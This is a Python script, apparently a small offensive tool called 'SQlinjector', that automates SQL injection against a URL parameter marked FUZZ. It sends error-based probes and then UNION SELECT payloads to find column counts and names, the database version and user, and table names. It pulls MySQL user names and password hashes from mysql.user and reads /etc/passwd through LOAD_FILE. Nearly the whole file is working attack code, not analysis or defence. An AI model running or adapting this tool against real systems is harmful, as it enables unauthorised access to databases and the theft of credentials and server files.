from typing import Any
import requests
import sys
import getopt
import re

from requests import Response
from termcolor import colored


def banner():
    print("\n***************************************")
    print("* SQlinjector  1.0                      *")
    print("***************************************")


def usage():
    print("Usage:")
    print("		-w: url (https://somesite.com/news.php?id=FUZZ)\n")
    print("     -i: injection strings file \n")
    print("example: SQLinjector.py -w https://www.somesite.com/news.php?id=FUZZ \n")


def start(argv) -> None:
    banner()
    if sys.argv.__len__().__lt__(2):
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, "w:i:")
    except getopt.GetoptError:
        print("Error on arguments")
        sys.exit()

    for opt, arg in opts:
        if opt == '-w':
            url = arg
        elif opt == '-i':
            dictio = arg
    try:
        print(f"[-] Opening injections file: {dictio}")
        f = open(dictio, "r")
        name = f.read().splitlines()
    except:
        print(f"Failed opening file {dictio} \n")
        sys.exit()
    launcher(url, name)


def get_database_user(new_url: str) -> Any:
    req: Response = requests.get(new_url)
    raw: str = req.content.decode('utf-8')
    reg: str = "TOK([\*a-zA-Z0-9].+?)TOK+?"
    users = re.findall(reg, raw)
    u: list = []
    for user in users:
        print(user)
        u.append(user)
    return u








































































def steal_users(url) -> None:
    new_url: str = url.replace("FUZZ",
                               """1\'%20union%20SELECT%20CONCAT('TOK',user,'TOK'),CONCAT('TOK',password,'TOK')%20FROM%20mysql.user--%20-""")
    get_database_user(new_url)


def detect_user(url) -> list:
    new_url: str = url.replace("FUZZ", """\'%20union%20SELECT%201,CONCAT('TOK',user(),'TOK')--%20-""")
    return get_database_user(new_url)


def detect_version(url) -> list:
    new_url = url.replace("FUZZ", "\'%20union%20SELECT%201,CONCAT('TOK',@@version,'TOK')--%20-")
    req: Response = requests.get(new_url)
    raw: str = req.content.decode('utf-8')
    reg: str = "TOK([a-zA-Z0-9].+?)TOK+?"
    version = re.findall(reg, raw)
    v: list = []
    for ver in version:
        print(ver)
        v.append(ver)
    return v


def detect_table_names(url: str) -> None:
    new_url: str = url.replace("FUZZ",
                               """\'%20union%20SELECT%20CONCAT('TOK',table_schema,'TOK'),CONCAT('TOK',table_name,'TOK')%20FROM%20information_schema.tables%20WHERE%20table_schema%20!=%20%27mysql%27%20AND%20table_schema%20!=%20%27information_schema%27%20and%20table_schema%20!=%20%27performance_schema%27%20--%20-""")
    req: Response = requests.get(new_url)
    raw: str = req.content.decode('utf-8')
    reg: str = "TOK([a-zA-Z0-9].+?)TOK+?"
    tables = re.findall(reg, raw)
    for table in tables:
        print(table)


def read_file(url: str, filename: str) -> None:
    new_url: str = url.replace("FUZZ",
                               f"""A\'%20union%20SELECT%201,CONCAT('TOK',LOAD_FILE(\'{filename}\'),'TOK')--%20-""")
    req: Response = requests.get(new_url)
    raw: str = req.content.decode('utf-8')
    reg = "TOK(.+?)TOK+?"
    files = re.findall(reg, raw)
    print(raw)
    for x in files:
        if not x.find('TOK,'):
            print(x)


def launcher(url, dictio) -> None:
    injected: list = []
    for sqlinjection in dictio:
        injected.append(url.replace("FUZZ", sqlinjection))
    res = injector(injected)

    print("\n[+] Detection results:")
    print("------------------")
    for x in res:
        print(x.split(";")[0])

    print("\n[+] Detect columns: ")
    print("------------------")
    res = detect_columns(url)
    print(f"Number of columns: {res}")
    res = detect_columns_names(url)

    print("\n[+] Columns names found: ")
    print("------------------")
    for col in res:
        print(col)

    print(colored('[+] DB Version: ', 'green'))
    print("---------------")
    detect_version(url)

    print(colored('[+] Current USER: ', 'green'))
    print("---------------")
    detect_user(url)

    print(colored('[+] Attempting MYSQL user extraction', 'green'))
    print("-------------------------------------")
    steal_users(url)

    print(colored('[+] Get tables names:', 'green'))
    print("---------------------")
    detect_table_names(url)

    filename = "/etc/passwd"
    message = f"\n[+] Reading file: {filename}"
    print(colored(message, 'green'))
    print("---------------------------------")
    read_file(url, filename)

    sys.exit()


def injector(injected: list) -> list:
    errors: list = ['Mysql', 'error in your SQL']
    results: list = []

    for y in injected:
        print(f"[-] Testing errors: {y}")
        req: Any = requests.get(y)
        for x in errors:
            if req.content.find(x) != -1:
                res: Any = y + ";" + x
                results.append(res)
        return results


def detect_columns(url) -> str:
    new_url: str = url.replace("FUZZ", "admin' order by X-- -")
    y: int = 1
    while y < 20:
        req: Any = requests.get(new_url.replace("X", str(y)))
        if req.content.find(str.encode("Unknown")) == -1:
            y += 1
        else:
            break
    return str(y - 1)


def detect_columns_names(url) -> list:
    column_names: list = ['username', 'user', 'name', 'pass', 'passwd', 'password', 'id', 'role', 'surname', 'address']
    new_url: str = url.replace("FUZZ", "admin' group by X-- -")
    valid_cols: list = []

    for name in column_names:
        req = requests.get(new_url.replace("X", name))
        if req.content.find(str.encode("Unknown")) == -1:
            valid_cols.append(name)
        else:
            pass
    return valid_cols


if __name__ == '__main__':
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print("SQLinjector interrupted by user..!!")
